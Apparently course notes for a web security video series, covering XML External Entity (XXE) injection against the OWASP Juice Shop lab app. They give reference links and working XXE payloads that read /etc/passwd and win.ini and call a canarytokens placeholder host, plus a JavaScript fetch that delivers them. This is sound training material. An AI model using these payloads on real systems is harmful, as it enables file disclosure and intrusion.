# Video 6.2

* [[OWASP] A05:2021 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration)

# Video 6.3

* [[OWASP] Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)
* [What Are XML External Entity (XXE) Attacks](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/)
* [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
* [CWE-756: Missing Custom Error Page](https://cwe.mitre.org/data/definitions/756.html)

```xml
<?xml version="1.0"  encoding="UTF-8" ?>
<!DOCTYPE Wares [
  <!ENTITY ltd "Limited Edition ™">
]>
<Wares>
  <Item>Most Beautiful Apple (&ltd;)</Item>
  <Item>Highest Possible Mountain (&ltd;)</Item>
  <Item>Deepest Darkest Cave (&ltd;)</Item>
</Wares>
```

```xml
<Wares>
  <Item>Most Beautiful Apple (Limited Edition ™)</Item>
  <Item>Highest Possible Mountain (Limited Edition ™)</Item>
  <Item>Deepest Darkest Cave (Limited Edition ™)</Item>
</Wares>
```

```sh
# Load unsafe.yml that enables XXE challenge
# https://github.com/juice-shop/juice-shop/tree/master/config
sudo docker run --rm -it -e "NODE_ENV=unsafe" -d -p 127.0.0.1:3000:3000 bkimminich/juice-shop
```

# Video 6.4

* [Canarytokens](https://canarytokens.org/)
* [Webhook.site](https://webhook.site/)

## Different payloads

```js
var payload = `<?xml version="1.0"  encoding="UTF-8" ?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "http://canarytokens.com/URL">
]>
<foo>
  &xxe;
</foo>`;

fetch("http://localhost:3003/changelog", {
  "headers": {
    "content-type": "text/xml",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site"
  },
  "referrer": "http://localhost:3001/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": payload,
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```

```xml
<!-- Target: Linux -->
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>
  &xxe;
</foo>
```

```xml
<!-- Target: Windows -->
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>
  &xxe;
</foo>
```

```xml
<!-- Direct call to webhook.site is an another way -->
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "http://canarytokens.com/URL">
]>
<foo>
  &xxe;
</foo>
```

# Video 6.5

* [GitHub: JuiceShop/fileUpload.ts](https://github.com/juice-shop/juice-shop/blob/master/routes/fileUpload.ts)
* [CVE 2021-29447 report by Safe Security](https://www.safe.security/assets/img/research-paper/pdf/xml-external-entity-xxe-vulnerability-research-paper.pdf)
* [X41 BeanStack: Java Fingerprinting using Stack Traces](https://beanstack.io/)
